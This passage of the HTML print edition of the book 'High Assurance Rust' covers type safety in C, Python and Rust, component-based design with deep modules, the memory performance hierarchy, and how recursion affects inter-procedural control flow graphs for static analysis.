Most compile-time verification we take for granted today was still decades of research away.
Runtime checks were prohibitively expensive without a compiler sophisticated enough to know where they're not needed.
Thus, C's <strong>weak, static typing</strong> means subdued safety enforcement.
C types can be converted, or cast, implicitly - and thus often erroneously.</p>
<p>Weak typing, coupled with other design choices, has resulted in a language which allows for a devastating amount of <strong>Undefined Behavior (UB)</strong><sup class="footnote-reference" id="fr-UndefResearch-1"><a href="#footnote-UndefResearch">2</a></sup>: C programs can exhibit unpredictable behavior at runtime.
Due to "gaps" in the language specification, not problems with the implementation of any specific compiler.
And these gaps can't be fixed retro-actively, that might break existing C programs we all rely on.</p>
<p>The "Goldilocks Principle"<sup class="footnote-reference" id="fr-GoldiPrin-1"><a href="#footnote-GoldiPrin">3</a></sup>, named after a child's fable<sup class="footnote-reference" id="fr-Goldi-1"><a href="#footnote-Goldi">4</a></sup>, reflects a cross-domain understanding: we want to optimize for "just the right amount" of a property.
For us, that property is assurance under performance constraints.
Our three bears are C, Python, and Rust.
A rough high-level comparison:</p>
<div class="table-wrapper"><table><thead><tr><th></th><th>C</th><th>Python</th><th><strong>Rust</strong></th></tr></thead><tbody>
<tr><td><em>Type-safe?</em></td><td>No (Weak, <strong>Static</strong>)</td><td>No (<strong>Strong</strong>, Dynamic)</td><td><strong>Yes</strong> (<strong>Strong</strong>, <strong>Static</strong>)</td></tr>
<tr><td><em>Memory-safe?</em></td><td>No</td><td><strong>Yes</strong></td><td><strong>Yes</strong></td></tr>
<tr><td><em>Fast?</em></td><td><strong>Yes</strong></td><td>No</td><td><strong>Yes</strong></td></tr>
</tbody></table>
</div>
<blockquote>
<p><strong>Doesn't Python support optional static typing?</strong></p>
<p>A peer-reviewed, large-scale analysis<sup class="footnote-reference" id="fr-Py3Types-1"><a href="#footnote-Py3Types">5</a></sup> of real-world Python projects found that a small minority use type annotations (3.8%), those that do rarely use them correctly enough to pass a type check (15% of the 3.8%), and that popular type checkers (<code>MyPy</code> and <code>PyType</code>) produce false positives (44-49% of the time).</p>
<p>Worse yet, Python type checkers often disagree with each other.
Optional typing isn't a viable substitute for a compiler-enforced static type system - especially in a high assurance context.</p>
</blockquote>
<p>There's a great deal of nuance which the table doesn't capture.
But we'll use it to wrap up this aside on types and reliability.</p>
<blockquote>
<p><strong>How about Go?</strong></p>
<p>Go is a popular, modern, statically-typed, natively-compiled programming language.
It has fantastic concurrency support.
But garbage collection makes it unsuitable for a wide range of systems programming tasks.
Go has to "pause" your entire program at unpredictable intervals and execute an algorithm to clean up memory.
This is often unacceptable for real-time and low-latency systems.</p>
<p>Rust helps you wrangle memory at compile time, inserting allocation/deallocation logic based on variable scope.
The result is predictable performance.
Discord, makers of a popular chat application, found that Go's garbage collection wasn't compatible with a service's performance targets.
They re-wrote the service in Rust to eliminate latency spikes<sup class="footnote-reference" id="fr-DiscGo-1"><a href="#footnote-DiscGo">6</a></sup>.</p>
</blockquote>
<h2 id="takeaway-21"><a class="header" href="#takeaway-21">Takeaway</a></h2>
<p>At a mechanical level, type systems power the machinery by which data is read and written.
At a more abstract level, type systems ensure certain undesirable outcomes don't occur - so long as programmers don't introduce typecasting bugs.</p>
<p>Dynamically typed languages, which do type checking at runtime, introduce a reliability risk.
Previously explored paths and states can introduce crashes or exceptions.</p>
<p>Weak static typing, where type casting with little restriction is tolerated, is similarly risky.
It can introduce UB.
Whose consequences include crashes, incorrect results, and security vulnerabilities.</p>
<hr>
<ol class="footnote-definition"><li id="footnote-TPL">
<p><a href="https://www.cis.upenn.edu/~bcpierce/tapl/"><em>Types and Programming Languages</em></a>. Benjamin C. Pierce (2002). <a href="#fr-TPL-1">↩</a></p>
</li>
<li id="footnote-UndefResearch">
<p><a href="https://people.csail.mit.edu/nickolai/papers/wang-undef-2012-08-21.pdf"><em>Undefined Behavior: What Happened to My Code?</em></a>. Xi Wang, Haogang Chen, Alvin Cheung, Zhihao Jia, Nickolai Zeldovich, M. Frans Kaashoek (2012). <a href="#fr-UndefResearch-1">↩</a></p>
</li>
<li id="footnote-GoldiPrin">
<p><a href="https://en.wikipedia.org/wiki/Goldilocks_principle"><em>Goldilocks principle</em></a>. Wikipedia (2021) <a href="#fr-GoldiPrin-1">↩</a></p>
</li>
<li id="footnote-Goldi">
<p><a href="https://en.wikipedia.org/wiki/Goldilocks_and_the_Three_Bears"><em>Goldilocks and the Three Bears</em></a>. Robert Southey (1837). <a href="#fr-Goldi-1">↩</a></p>
</li>
<li id="footnote-Py3Types">
<p><a href="https://www.cs.rpi.edu/~milanova/docs/dls2020.pdf"><em>Python 3 Types in the Wild: A Tale of Two Type Systems</em></a>. Ingkarat Rak-amnouykit, Daniel McCrevan, Ana Milanova, Martin Hirzel, Julian Dolby (2020). <a href="#fr-Py3Types-1">↩</a></p>
</li>
<li id="footnote-DiscGo">
<p><a href="https://blog.discord.com/why-discord-is-switching-from-go-to-rust-a190bbca2b1f"><em>Why Discord is switching from Go to Rust</em></a>. Jesse Howarth (2020). <a href="#fr-DiscGo-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="fundamentals-component-based-design"><a class="header" href="#fundamentals-component-based-design">Fundamentals: Component-Based Design</a></h1>
<p>Assume an Application Programming Interface (API) includes one or more of the below pieces:</p>
<ul>
<li>Data type definitions (structures, enums, etc)</li>
<li>Function declarations</li>
<li>Constants</li>
<li>Specifications for remote request-response formats, such as:
<ul>
<li>REST (Representational State Transfer)<sup class="footnote-reference" id="fr-REST-1"><a href="#footnote-REST">1</a></sup></li>
<li>gRPC (Google Remote Procedure Call)<sup class="footnote-reference" id="fr-GRPC-1"><a href="#footnote-GRPC">2</a></sup></li>
</ul>
</li>
</ul>
<p>"Deep modules", according to John Ousterhout<sup class="footnote-reference" id="fr-DeepMod-1"><a href="#footnote-DeepMod">3</a></sup>, are those in which well-designed APIs hide, or abstract, an iceberg of underlying complexity.</p>
<p>Deep modules often have the advantage of making codebases easier to maintain and refactor.
Good abstractions also make APIs straightforward to learn initially and use correctly.
Whether the interface is for an external customer or for another component within the codebase.</p>
<p>Depth becomes especially important once we consider the cumulative complexity of a large system with multiple <em>components</em>.</p>
<p>In most contexts, <em>module</em> and <em>component</em> are synonymous.
But for our purposes, a component is composed of one or more modules.
So a component is a bigger (potentially multi-module) piece.
We'll soon see diagrams that make this distinction clearer.</p>
<blockquote>
<p><strong>What's a real-world example of a "deep module"?</strong></p>
<p>Ousterhout cites <em>system calls</em><sup class="footnote-reference" id="fr-DeepMod-2"><a href="#footnote-DeepMod">3</a></sup>, the OS mechanism by which userspace applications request hardware-related and/or privileged services, as a prototypical example.</p>
<p>A small handful of calls abstract the gory details of, say, writing a file to a physical hard disk of a particular variety and manufactured by a particular vendor.
The OS provides a small and stable API <em>externally</em>, while being free to manage the inherent complexity <em>internally</em>.</p>
<p>One could argue that the core project of this book is, like many other dynamic collections, also a deep module.
We provide an API-compatible alternative to a standard library collection, but abstract away the specifics of the underlying data structure and its memory management strategy.</p>
</blockquote>
<p>So, when leveraging any code organization facility, be it Rust's module system or some other language's equivalent, our goal is to create "deep" modules and collect them into components with "loose" coupling.
Meaning well-isolated pieces that offer rich functionality via a small API surface.</p>
<p>In general, this approach results in a codebase that's easier to work with for new team members and easier to improve for everyone.
That means less time firefighting and more time shipping new features.
And, by keeping complexity in check, we also reduce security and reliability risks.</p>
<h2 id="effective-componentization"><a class="header" href="#effective-componentization">Effective Componentization</a></h2>
<p>Depth tends to, naturally, minimize coupling and maximize cohesion. Defined as<sup class="footnote-reference" id="fr-Ccord-1"><a href="#footnote-Ccord">4</a></sup>:</p>
<ul>
<li>
<p><strong>Coupling:</strong> a measure of interdependency between APIs.</p>
<ul>
<li>E.g. Mutual reliance on the same custom data types in public signatures. Or private, global shared state.</li>
</ul>
</li>
<li>
<p><strong>Cohesion:</strong> a measure of the commonality between individual elements of an API.</p>
<ul>
<li>E.g. Do functions exposed by a module have a clear logical relationship to each other? If so, the module has high cohesion.</li>
</ul>
</li>
</ul>
<p>While low coupling, high cohesion components are generally desirable, they may not always be practical.
For example, a centralized piece of functionality can be more easily replaced with a faster algorithm or a more secure implementation.
But centralization sometimes increases coupling.</p>
<p>Similarly, an API that's overly-specific is hard to future-proof - new requirements can mean a breaking change.
But if an API is too general, it likely requires cumbersome wrappers to meet current, specific needs without reducing cohesion.</p>
<h2 id="visualizing-component-based-design"><a class="header" href="#visualizing-component-based-design">Visualizing Component-based Design</a></h2>
<p>Components whose modules have fewer and simpler public APIs often entail less stability burden and lower chance of misuse.
Such components help us more effectively compose large, ambitious, multi-component systems.</p>
<p>Visually, that entails moving away from <strong>fragile systems</strong> where components expose and rely on each other's internals:</p>
</br>
<p align="center">
  <img width="100%" src="chp16_appendix/mod_shallow.svg">
  <figure>
  <figcaption><center>Fragile: shallow components with high/complex coupling.</center></figcaption><br>
  </figure>
</p>
<p>And toward <strong>agile systems</strong> that abstract away internal complexity (while delivering the same functionality):</p>
</br>
<p align="center">
  <img width="100%" src="chp16_appendix/mod_deep.svg">
  <figure>
  <figcaption><center>Agile: deep components with low/loose coupling.</center></figcaption><br>
  </figure>
</p>
<p>Here, "agile" means a codebase that's easy to onboard for, extend, and refactor.
Not Agile<sup class="footnote-reference" id="fr-Agile-1"><a href="#footnote-Agile">5</a></sup>, the umbrella term for a set of software development frameworks.</p>
<p>Note how, in both designs, the number of modules within each component (six) didn't change.
We're not removing functionality, just external-facing complexity.
The end user's cognitive load is reduced.
Total "work done" isn't.</p>
<h2 id="the-importance-of-planning-and-iterating"><a class="header" href="#the-importance-of-planning-and-iterating">The Importance of Planning and Iterating</a></h2>
<p>Complexity is the enemy of both productivity and security.
But the first iteration of a feature to hit production likely won't be elegantly crafted.
Aiming for perfection is unrealistic in most commercial contexts.</p>
<p>Instead, we can aim to make our first version <em>well-designed</em>.
That may mean using our organization's or team's current quality bar as a watermark.
And striving to push it a bit higher while still delivering on time.</p>
<p>Now the first architecture is sometimes the one a system gets stuck with for its entire lifecycle.
So budgeting design time up front can pay significant dividends.
For production infrastructure, the result could be a reduced number of 3:00am phone calls for outages and breaches.
But the average case, planned maintenance, is also lower cost for well-designed systems.</p>
<p>The best designs for high-value systems are almost always a result of iteration.
When we have the opportunity to significantly refactor an existing system, or create a successor from scratch, we can apply lessons learned.
So even if you can't justify a sweeping change today, it's worth noting current limitations for tomorrow.</p>
<h2 id="takeaway-22"><a class="header" href="#takeaway-22">Takeaway</a></h2>
<p>Low-complexity systems tend to be more reliable, maintainable, and secure.
Keeping complexity in check typically means designing for low coupling and high cohesion.
Deep modules lend themselves well to both goals.</p>
<hr>
<ol class="footnote-definition"><li id="footnote-REST">
<p><a href="https://www.redhat.com/en/topics/api/what-is-a-rest-api">What is a REST API?</a>. RedHat (2020). <a href="#fr-REST-1">↩</a></p>
</li>
<li id="footnote-GRPC">
<p><a href="https://grpc.io/docs/what-is-grpc/core-concepts/">Core concepts, architecture and lifecycle</a>. Google (Accessed 2022). <a href="#fr-GRPC-1">↩</a></p>
</li>
<li id="footnote-DeepMod">
<p><a href="https://amzn.to/3DbaPrp"><em><strong>[PERSONAL FAVORITE]</strong> A Philosophy of Software Design</em></a>. John Ousterhout (2021). <a href="#fr-DeepMod-1">↩</a> <a href="#fr-DeepMod-2">↩2</a></p>
</li>
<li id="footnote-Ccord">
<p><a href="https://amzn.to/3wBuNu7"><em><strong>[PERSONAL FAVORITE]</strong> Effective C: An Introduction to Professional C Programming</em></a>. Robert Seacord (2020). <a href="#fr-Ccord-1">↩</a></p>
</li>
<li id="footnote-Agile">
<p><a href="https://www.agilealliance.org/agile101/"><em>What is Agile?</em></a>. Agile Alliance (Accessed 2022). <a href="#fr-Agile-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="fundamentals-memory-hierarchy"><a class="header" href="#fundamentals-memory-hierarchy">Fundamentals: Memory Hierarchy</a></h1>
<p>Most programmers aren't aware of the gory details of interacting with the hardware beneath them.
That's by design.
It's the result of a multi-decade software-hardware co-evolution.</p>
<p>Consider the humble <code>print</code> statement.
Last time you printed formatted output to a console, you likely didn't have think about:</p>
<ul>
<li>
<p>Flushing buffers for a character device (OS software "glue" abstraction to vendor-specific hardware).</p>
</li>
<li>
<p>The intricacies of how parity bits work in the Universal Asynchronous Receiver/Transmitter (UART<sup class="footnote-reference" id="fr-UART-1"><a href="#footnote-UART">1</a></sup>) protocol (encoding for physical transmission medium).</p>
</li>
</ul>
<p>These are minutiae most day-to-day development shouldn't have to factor in.
Memory hardware technology is, likewise, something you'll be largely abstracted from.
Most of the time, you can think of a computer, any computer, as a composite of two distinct parts:</p>
<ol>
<li>
<p>A <strong>Central Processing Unit (CPU)</strong> that fetches, decodes, and executes instructions from compiled binaries.</p>
</li>
<li>
<p>A singular <strong>memory system</strong> holding instructions the CPU reads and data it operates on.</p>
</li>
</ol>
<p>In this simple two part conceptualization, memory is just a linear array of bytes that can be addressed individually and accessed in constant time.
But that's not reality.</p>
<p>What we think of as "memory", from a software perspective, is actually a heterogeneous mix of hardware technologies that offer varying speeds and capacities at different price points.
And that can have repercussions for systems software.</p>
<p>Decisions you make as a systems programmer can determine what particular kind of storage hardware your program makes use of during its execution.
And this hardware's characteristics can have a <em>significant</em> impact on the speed of your program.
So we need to ground our discussion of memory in its physical reality: the performance hierarchy of contemporary storage technologies.</p>
<blockquote>
<p><strong>Credit where credit is due</strong></p>
<p>The contents of this chapter are heavily influenced by <a href="https://amzn.to/3IBnFA7"><em>Computer Systems: A Programmer's Perspective</em></a><sup class="footnote-reference" id="fr-CSAPP-1"><a href="#footnote-CSAPP">2</a></sup>.</p>
<p>The book's authors, professors at Carnegie Mellon University, use it to teach an undergraduate CS course. The course number is 15-213, affectionately called "the course that gives CMU its zip" because 15213 is the ZIP code in which the university is located and because the course is so foundational in the university's core CS curriculum.</p>
<p>CS:APP is a well-regarded text and a detailed introduction to both computer architecture and operating systems.
Highly recommend it.</p>
</blockquote>
<h2 id="the-memory-performance-hierarchy"><a class="header" href="#the-memory-performance-hierarchy">The Memory Performance Hierarchy</a></h2>
<p>We can arrange modern memory technologies into distinct, hierarchical tiers.</p>
<ul>
<li>
<p>The higher tiers are <strong>incredibly fast</strong> but also <strong>incredibly expensive per byte</strong>. They are a scarce resource. As a consequence, the amount of data they can store is limited.</p>
</li>
<li>
<p>The lower tiers are <strong>relatively slow</strong> but also <strong>relatively cheap per byte</strong>. They're a plentiful resource, we're free to store large amounts of data in them.</p>
</li>
</ul>
<p>Consider this breakdown:</p>
<div class="table-wrapper"><table><thead><tr><th>Storage Technology</th><th>Unit of Storage</th><th>Access Time (Nanoseconds) <sup class="footnote-reference" id="fr-CornellCompArch-1"><a href="#footnote-CornellCompArch">3</a></sup></th><th>Explicit APIs?</th></tr></thead><tbody>
<tr><td>CPU Registers</td><td>4-8 bytes per register</td><td>1 ns</td><td>No</td></tr>
<tr><td>SRAM Cache</td><td>Kilobytes, Megabytes</td><td>1 to 4 ns (L1 to L2<sup class="footnote-reference" id="fr-L1-1"><a href="#footnote-L1">4</a></sup>)</td><td>No</td></tr>
<tr><td>DRAM</td><td>Gigabytes</td><td>100 ns</td><td>Yes, stack and heap</td></tr>
<tr><td>Local Disk</td><td>Gigabytes, Terabytes</td><td>16,000 to 4,000,000 ns (SSD read to HDD seek<sup class="footnote-reference" id="fr-SSD-1"><a href="#footnote-SSD">5</a></sup>)</td><td>Yes, unless DRAM exhausted (swap)</td></tr>
<tr><td>Remote Storage</td><td><em>N/A, Unlimited</em></td><td>15,0000,000 ns (Packet RTT<sup class="footnote-reference" id="fr-RTT-1"><a href="#footnote-RTT">6</a></sup> California to/from Netherlands)</td><td>Yes, networking</td></tr>
</tbody></table>
</div>
<ul>
<li>
<p><strong>CPU Registers:</strong> Accessed directly when instructions execute (e.g. in 0 CPU cycles<sup class="footnote-reference" id="fr-CSAPP-2"><a href="#footnote-CSAPP">2</a></sup>), registers sit at the top of the hierarchy.</p>
<ul>
<li>Register allocation is handled by the compiler, in accordance with a target machine's Application Binary Interface (ABI)<sup class="footnote-reference" id="fr-ABI-1"><a href="#footnote-ABI">7</a></sup>. Unless you're writing inline assembly<sup class="footnote-reference" id="fr-InAsm-1"><a href="#footnote-InAsm">8</a></sup> (intermixing architecture-specific instructions with Rust source code), you won't control register usage directly.</li>
</ul>
</li>
<li>
<p><strong>SRAM Cache:</strong> A small memory bank built into the CPU, physically close to the register action. Accessible in 4 to 75 CPU cycles<sup class="footnote-reference" id="fr-CSAPP-3"><a href="#footnote-CSAPP">2</a></sup>.</p>
<ul>
<li>How often data your code needs will be present in the cache (aka "cache hit ratio") is a side effect of how your code is written, but not something you can explicitly control with API calls. Data-oriented Programming<sup class="footnote-reference" id="fr-DataRust-1"><a href="#footnote-DataRust">9</a></sup> deals with structuring programs to make optimal use of CPU caches.</li>
</ul>
</li>
<li>
<p><strong>DRAM:</strong> Main memory, the sweet spot for most systems programming. Accessible in hundreds of cycles<sup class="footnote-reference" id="fr-CSAPP-4"><a href="#footnote-CSAPP">2</a></sup>.</p>
<ul>
<li>Often, we can explicitly control which regions of main memory we use. Specifically whether data is stored on the stack, the heap, static memory, or even "memory-mapped" files - among other locations. Each option has performance implications. You already wrote a stack-only program: the RC4 implementation in the Chapter 2 specified the <code>#![no_std]</code> attribute.</li>
</ul>
</li>
<li>
<p><strong>Local Disk:</strong> Long-term storage that persists across runs of a program or reboots of a machine. Accessible in tens of millions of cycles<sup class="footnote-reference" id="fr-CSAPP-5"><a href="#footnote-CSAPP">2</a></sup>, a significant penalty relative to the levels above.</p>
<ul>
<li>Interacting with local disk storage typically means calling explicit APIs to open, read, or write files. Unless all available DRAM is currently in use - in which case the OS is forced to <em>page</em><sup class="footnote-reference" id="fr-Paging-1"><a href="#footnote-Paging">10</a></sup> your program data to/from local secondary storage behind-the-scenes.</li>
</ul>
</li>
<li>
<p><strong>Remote Disk:</strong> Long-term storage on a physically separate machine, connected to the host running your program via a network. Access latency can't even be measured in CPU cycles, there are too many unpredictable factors at play (protocols, physical distance, network congestion, etc). The above table uses nanosecond estimates<sup class="footnote-reference" id="fr-CornellCompArch-2"><a href="#footnote-CornellCompArch">3</a></sup> for your convenience.</p>
<ul>
<li>There's no way to implicitly download/upload data from/to a remote machine, you must call a networking API directly or indirectly.</li>
</ul>
</li>
</ul>
<blockquote>
<p><strong>Memory Management in Modern Operating Systems</strong></p>
<p>Paging schemes<sup class="footnote-reference" id="fr-Paging-2"><a href="#footnote-Paging">10</a></sup> are a part of how <em>virtual memory</em> (an abstraction for DRAM managed by the OS) is implemented.
This is a complex topic with many implications, I'd recommend Chapter 9 of CS:APP<sup class="footnote-reference" id="fr-CSAPP-6"><a href="#footnote-CSAPP">2</a></sup> for a thorough exploration.
To summarize, we can think of virtual memory as providing three benefits:</p>
<ul>
<li>
<p><strong>Simplified view of memory:</strong> Each process is given an uniform linear virtual address space to run in, regardless of where it's actually mapped in physical memory and whether or not some of those mappings are shared with another process.</p>
</li>
<li>
<p><strong>Address space isolation:</strong> The OS can enforce isolation between the address spaces of each process, preventing one process from corrupting another. Likewise userspace applications (e.g. your program) can't access kernel space (e.g. OS internals).</p>
</li>
<li>
<p><strong>Efficiency through caching:</strong> Allows main memory (system DRAM) to act as a cache for files on disk, making active items more quickly accessible and managing the back-and-forth transfer between DRAM and disk (paging). The smallest unit of data an OS can move is 1 page (typically 4 kB).</p>
</li>
</ul>
</blockquote>
<h2 id="ok-but-what-are-the-practical-implications-of-all-this"><a class="header" href="#ok-but-what-are-the-practical-implications-of-all-this">Ok, but what are the practical implications of all this?</a></h2>
<p>Distinct types of memory hardware have a significant impact on performance.
Potentially orders of magnitude.
So, assuming we've picked the <em>fastest known algorithm</em>, we should keep two facts in mind:</p>
<ul>
<li>
<p><strong>Disk and/or network I/O is expensive but explicit.</strong> The bottom two rungs of the memory performance hierarchy are far slower, but at least we can consciously control their usage.</p>
<ul>
<li>In addition to being slow, file and network I/O are <em>fallible</em>. A file might have moved or changed permissions. A remote server may become temporarily or permanently inaccessible. Logic for handling these cases, whether it be propagating an error or retrying an alternate path/host, further exacerbates performance cost.</li>
</ul>
</li>
<li>
<p><strong>Cache optimization can be a differentiator.</strong> Rust's <code>BTreeSet</code><sup class="footnote-reference" id="fr-BTreeSet-1"><a href="#footnote-BTreeSet">11</a></sup> and <code>BTreeMap</code><sup class="footnote-reference" id="fr-BTreeMap-1"><a href="#footnote-BTreeMap">12</a></sup>, the standard library collections we'll build alternatives to, are specifically designed to maximize SRAM cache efficiency. Both are very performant.</p>
<ul>
<li>
<p>As an aside, the standard libraries of C++ and Java both use Red-Black Trees. B-trees are more common in filesystem and database use cases.</p>
</li>
<li>
<p>Our library's optimizations target another level of the hierarchy: DRAM. Using an index-based allocator pattern (introduced in Chapter 6), we'll ensure our code only uses <em>stack</em> DRAM. The result is embedded portability.</p>
</li>
</ul>
</li>
</ul>
<blockquote>
<p><strong>Why the "fastest known algorithm" caveat?</strong></p>
<p>Algorithms typically have a much greater performance impact than the kind of physical memory backing execution.</p>
<p>If you implement a quadratic time solution when a problem can be solved in linear time, no amount of SRAM locality can compensate.
The latter solution scales far, far better regardless.</p>
<p>We discuss the basics of algorithmic complexity in Chapter 7.</p>
</blockquote>
<h2 id="takeaway-23"><a class="header" href="#takeaway-23">Takeaway</a></h2>
<p>Much as we'd like to believe memory is just a linear array of bytes, the reality is it's a hierarchy of hardware making cost/performance tradeoffs.
This physical view of memory is foundational.</p>
<p>But day-to-day systems programming is more concerned with a logical view of memory, namely managing stack frames and heap buffers.
Stored in DRAM.
That's the abstraction through which we view all code in this book.</p>
<hr>
<ol class="footnote-definition"><li id="footnote-UART">
<p><a href="https://www.circuitbasics.com/basics-uart-communication/"><em>Basics of UART Communication</em></a>. Scott Campbell (Accessed 2022). <a href="#fr-UART-1">↩</a></p>
</li>
<li id="footnote-CSAPP">
<p><a href="https://amzn.to/3IBnFA7"><em><strong>[PERSONAL FAVORITE]</strong> Computer Systems: A Programmer's Perspective</em></a>. Randal Bryant, David O'Hallaron (2015). <a href="#fr-CSAPP-1">↩</a> <a href="#fr-CSAPP-2">↩2</a> <a href="#fr-CSAPP-3">↩3</a> <a href="#fr-CSAPP-4">↩4</a> <a href="#fr-CSAPP-5">↩5</a> <a href="#fr-CSAPP-6">↩6</a></p>
</li>
<li id="footnote-CornellCompArch">
<p><a href="https://people.orie.cornell.edu/bdg79/ORIE6125/lecture8.html"><em>ORIE 6125: Week 8 - Computer architecture</em></a>. Cornell University (Accessed 2022). <a href="#fr-CornellCompArch-1">↩</a> <a href="#fr-CornellCompArch-2">↩2</a></p>
</li>
<li id="footnote-L1">
<p><a href="https://en.wikipedia.org/wiki/CPU_cache#MULTILEVEL">Multi-level caches</a>. Wikipedia (Accessed 2022). <a href="#fr-L1-1">↩</a></p>
</li>
<li id="footnote-SSD">
<p>Solid State Drives (SSDs) and Hard Disk Drives (HDDs) are two secondary storage technologies. The former offers faster read and write speeds. <a href="#fr-SSD-1">↩</a></p>
</li>
<li id="footnote-RTT">
<p>Round Trip Time (RTT), in this context, is the amount of time it takes for a packet to reach a destination and for an acknowledgment to come back. <a href="#fr-RTT-1">↩</a></p>
</li>
<li id="footnote-ABI">
<p><a href="https://en.wikipedia.org/wiki/Application_binary_interface">Application binary interface</a>. Wikipedia (Accessed 2022). <a href="#fr-ABI-1">↩</a></p>
</li>
<li id="footnote-InAsm">
<p><a href="https://blog.rust-lang.org/inside-rust/2020/06/08/new-inline-asm.html"><em>New inline assembly syntax available in nightly</em></a>. Josh Triplett (2020). <a href="#fr-InAsm-1">↩</a></p>
</li>
<li id="footnote-DataRust">
<p><a href="http://jamesmcm.github.io/blog/2020/07/25/intro-dod/"><em>An introduction to Data Oriented Design with Rust</em></a>. James McMurray (2020). <a href="#fr-DataRust-1">↩</a></p>
</li>
<li id="footnote-Paging">
<p><a href="https://wiki.osdev.org/Paging">Paging</a>. OSDev Wiki (Accessed 2022). <a href="#fr-Paging-1">↩</a> <a href="#fr-Paging-2">↩2</a></p>
</li>
<li id="footnote-BTreeSet">
<p><a href="https://doc.rust-lang.org/stable/std/collections/struct.BTreeSet.html"><em>Struct <code>std::collections::BTreeSet</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-BTreeSet-1">↩</a></p>
</li>
<li id="footnote-BTreeMap">
<p><a href="https://doc.rust-lang.org/std/collections/struct.BTreeMap.html"><em>Struct <code>std::collections::BTreeMap</code></em></a>. The Rust Team (Accessed 2022). <a href="#fr-BTreeMap-1">↩</a></p>
</li>
</ol><div style="break-before: page; page-break-before: always;"></div><meta name="title" content="High Assurance Rust">
<meta name="description" content="Developing Secure and Robust Software">
<meta property="og:title" content="High Assurance Rust">
<meta property="og:description" content="Developing Secure and Robust Software">
<meta property="og:type" content="article">
<meta property="og:url" content="https://highassurance.rs/">
<meta property="og:image" content="https://highassurance.rs/img/har_logo_social.png">
<meta name="twitter:title" content="High Assurance Rust">
<meta name="twitter:description" content="Developing Secure and Robust Software">
<meta name="twitter:url" content="https://highassurance.rs/">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://highassurance.rs/img/har_logo_social.png">
<h1 id="inter-procedural-control-flow-graphs-icfgs"><a class="header" href="#inter-procedural-control-flow-graphs-icfgs">Inter-procedural Control Flow Graphs (ICFGs)</a></h1>
<p>When possible, eliminating a bug category with a pattern is ideal for static assurance.
We saw this when exploring stack safety and MISRA C 17.2<sup class="footnote-reference" id="fr-MISRA_2012-1"><a href="#footnote-MISRA_2012">1</a></sup> ("no recursion") in Chapter 4, Section 2.</p>
<p>What impact does recursion have on the more general case, arbitrary static analysis and/or verification tooling?</p>
<p>Technically, it depends.
Realistically, many useful tools need to build a static <strong>Inter-procedural Control Flow Graph (ICFG)</strong>.
Because it's a "backbone" common analysis algorithms run on.
And because understanding all possible call sequences often enables judgments about all possible executions.</p>
<p>We're going to consider 3 ICFGs of increasing complexity.
First, our MISRA C 17.2-compatible, iterative program from Chapter 4.2:</p>
</br>
<p align="center">
  <img width="50%" src="chp16_appendix/icfg_iter.svg">
  <figure>
  <figcaption><center>Iterative program ICFG - a Directed Acyclic Graph (DAG)</center></figcaption><br>
  </figure>
</p>
<ul>
<li>
<p>This is a <strong>Directed Acyclic Graph (DAG)</strong>. For analysis authors, this graph enables certain algorithms or possibilities.</p>
<ul>
<li>Example: topological sort<sup class="footnote-reference" id="fr-TopSort-1"><a href="#footnote-TopSort">2</a></sup>, which can be used to represent a valid sequence of tasks, requires a DAG.</li>
</ul>
</li>
</ul>
<p>Next, our initial, recursive version (also from 4.2):</p>
</br>
<p align="center">
  <img width="50%" src="chp16_appendix/icfg_rec.svg">
  <figure>
  <figcaption><center>Recursive program ICFG - a Directed Graph (DG)</center></figcaption><br>
  </figure>
</p>
<ul>
<li>
<p>This is a <strong>Directed Graph (DG)</strong>. For some analysis authors, a problem just got harder. They may be forced to over-approximate (allow false positives) or relax guarantees (weaker analysis).</p>
<ul>
<li>Example: static calculation of a program's worst case stack utilization.</li>
</ul>
</li>
</ul>
<p>There's also mutual recursion, where two or more functions call each other.
Let's just consider it an even less desirable variation of the prior recursive version:</p>
</br>
<p align="center">
  <img width="50%" src="chp16_appendix/icfg_mut_rec.svg">
  <figure>
  <figcaption><center>Mutually recursive program ICFG - a Directed Graph (DG) variation.</center></figcaption><br>
  </figure>
</p>
<p>A DAG vs DG comparison is intentionally vague, we can't really make any claims about static analyzers as a whole - there probably exist thousands of static analyzers serving hundreds of use cases.
But it helps build an intuition.
Imagine writing logic to traverse these graphs - a DAG avoids edge cases.</p>
<h2 id="takeaway-24"><a class="header" href="#takeaway-24">Takeaway</a></h2>
<p>Recursion isn't only a problem for runtime memory exhaustion.
It impacts a program's Inter-procedural Control Flow Graph (ICFG), generally hindering static analysis.</p>
<hr>
<ol class="footnote-definition"><li id="footnote-MISRA_2012">
<p><em>MISRA C: 2012 Guidelines for the use of the C language in critical systems (3rd edition)</em>. MISRA (2019). <a href="#fr-MISRA_2012-1">↩</a></p>
</li>
<li id="footnote-TopSort">
<p><a href="https://en.wikipedia.org/wiki/Topological_sorting"><em>Topological sorting</em></a>. Wikipedia (Accessed 2023). <a href="#fr-TopSort-1">↩</a></p>
</li>
</ol>
                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->


                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">

            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="elasticlunr.min.js"></script>
